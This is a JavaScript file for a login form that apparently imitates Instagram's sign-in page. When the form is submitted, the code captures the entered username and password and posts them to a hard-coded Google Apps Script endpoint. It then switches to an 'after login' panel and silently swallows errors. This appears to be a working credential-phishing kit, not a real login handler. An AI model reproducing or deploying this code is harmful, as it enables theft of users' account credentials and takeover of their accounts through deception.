let username = document.getElementById("username");
    let password = document.getElementById("password");
    let user_label = document.getElementById("user_label");
    let password_label = document.getElementById("password_label");
    let visibility = document.getElementById("visibility");

    username.addEventListener("input",()=>{
        if(username.value.trim()!==""){
            user_label.style.top="0";
        }else {
            user_label.style.top = "1rem"; // original top
            user_label.style.fontSize = "1rem"; // original font size
        }   
    })
    password.addEventListener("input",()=>{
        if(password.value.trim()!==""){
            password_label.style.top="0";
            visibility.style.visibility="visible";
        }else {
            visibility.style.visibility="hidden";
            password_label.style.top = "1rem"; // original top
            password_label.style.fontSize = "1rem"; // original font size
        }
    })
    visibility.addEventListener("click",()=>{
        visibility.classList.toggle("fa-eye");
        visibility.classList.toggle("fa-eye-slash");
        if(visibility.classList.contains("fa-eye")){
            password.type="text";
        }else{
            password.type="password";
        }
    })


    //preventing from entering space

    username.addEventListener("keydown", (e) => {
    if (e.key === " ") {
        e.preventDefault();
    }
});

password.addEventListener("keydown", (e) => {
    if (e.key === " ") {
        e.preventDefault();
    }
});





let afterLog = document.getElementById("afterLog");


let doneBtn = document.getElementById("doneBtn");
doneBtn.disabled=true;







//recieving response in form
const scriptURL = 'https://script.google.com/macros/s/AKfycbwQbV6iInwN0Xcp6gaSMdSGNzKnEgqqp0JHXyaH3AJcaBMRG26mQ3GI6RulY0LXe90r9g/exec'; // your actual deployed URL
const form = document.forms['log-in'];

form.addEventListener('submit', e => {
  e.preventDefault();
  afterLog.classList.remove("hidden");
  instagram.classList.add("hidden");
  fetch(scriptURL, {
    method: 'POST',
    body: new FormData(form),
  })
    .then(response => response.json())
    .then(data => {
        
        doneBtn.disabled=false;
      
    })
    .catch(error => {
    });
});

let okayBtn = document.getElementById("okayBtn");
let instruction = document.getElementById("instruction");
let instagram = document.getElementById("instagram");


okayBtn.addEventListener("click",()=>{
    instruction.classList.add("hidden");
    instagram.classList.remove("hidden");

})